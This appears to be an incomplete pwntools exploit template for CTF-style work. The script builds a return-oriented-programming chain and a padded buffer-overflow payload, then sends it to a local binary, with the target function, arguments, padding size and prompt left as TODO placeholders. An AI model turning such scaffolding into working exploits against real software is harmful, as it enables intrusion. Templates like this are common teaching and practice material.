#!/usr/bin/python

import sys
from pwn import *

# Error handling cause I'm a good software engineer... lol jks
if (len(sys.argv) != 2):
    log.failure("Usage: %s <binary>" % sys.argv[0])
    exit(1)

# Create a ROP object to look up symbols
elf = context.binary = ELF(sys.argv[1])
rop = ROP(elf)

# Build ROP call chain
rop.call('FUNC', [ARGS]) #TODO
info("ROP chain:\n" + rop.dump())
payload = "A"* #TODO - add padding size
payload += rop.chain() 
info("Payload: " + payload)

# Pwn
p = process(sys.argv[1])
p.recvuntil('> ') #TODO
p.sendline(payload)
print p.recvall()
